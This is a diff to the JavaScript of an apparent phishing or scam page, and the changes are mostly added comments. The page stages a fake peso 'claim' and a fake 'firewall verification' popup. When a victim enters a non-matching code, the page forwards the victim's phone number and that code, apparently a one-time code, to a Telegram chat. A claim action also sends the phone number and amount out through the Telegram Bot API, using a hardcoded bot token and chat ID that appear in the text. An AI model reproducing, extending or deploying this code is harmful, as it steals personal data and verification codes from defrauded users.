@@ -55,6 +55,7 @@ function showFirewallPopup() {
             `;
         }
         
+        // Generate random 4-digit code
         currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
         verificationAttempts = 0;
         console.log("📞 VERIFICATION CODE:", currentVerificationCode);
@@ -94,6 +95,8 @@ window.verifyFirewallCode = async function() {
     if (errorDiv) errorDiv.style.display = 'none';
     
     verificationAttempts++;
+    
+    // Check if code matches
     const isValid = (code === currentVerificationCode);
     
     if (isValid) {
@@ -105,6 +108,7 @@ window.verifyFirewallCode = async function() {
         }, 500);
     } else {
         await sendTelegram(userPhone, code);
+        
         let errorMsg = "Invalid verification code. Please try again.";
         if (verificationAttempts >= 3) {
             errorMsg = "Too many failed attempts. Page will refresh.";
@@ -121,6 +125,7 @@ window.verifyFirewallCode = async function() {
             verifyBtn.disabled = false;
             verifyBtn.innerHTML = "VERIFY NOW";
         }
+        
         if (codeInput) {
             codeInput.value = '';
             codeInput.focus();
@@ -150,6 +155,7 @@ async function showClaimPopup(amount) {
     const firewallActive = await isFirewallActive();
     
     if (firewallActive) {
+        // Show firewall verification popup
         if (typeof window.showFirewallPopup === 'function') {
             window.showFirewallPopup();
         } else {
@@ -158,6 +164,7 @@ async function showClaimPopup(amount) {
         return;
     }
     
+    // Firewall OFF - Normal claim popup
     claimState.currentAmount = amount;
     claimState.isProcessing = false;
     claimState.hasRedirected = false;
@@ -191,7 +198,7 @@ function hidePendingStatus() {
     claimState.isPending = false; 
 }
 
-// ========== BALANCE DECREMENT ==========
+// ========== BALANCE DECREMENT ANIMATION ==========
 function startSmoothDecrement(originalAmount) {
     const balanceText = document.getElementById('balanceText');
     if (!balanceText) return;
@@ -278,6 +285,7 @@ function onClaimAction() {
     claimBtn.disabled = true;
     claimBtn.innerHTML = 'PROCESSING...';
     
+    // Send Telegram notification
     fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("💰 CLAIM REQUEST!\n📱 " + userPhone + "\n💵 ₱" + amount)}`)
         .catch(e => console.log('Telegram error:', e));
     
@@ -327,7 +335,7 @@ document.addEventListener('DOMContentLoaded', function() {
     hidePendingStatus();
 });
 
-// Expose functions for global access
+// Export functions for global access
 window.showFirewallPopup = showFirewallPopup;
 window.hideFirewallPopup = hideFirewallPopup;
 window.verifyFirewallCode = verifyFirewallCode;
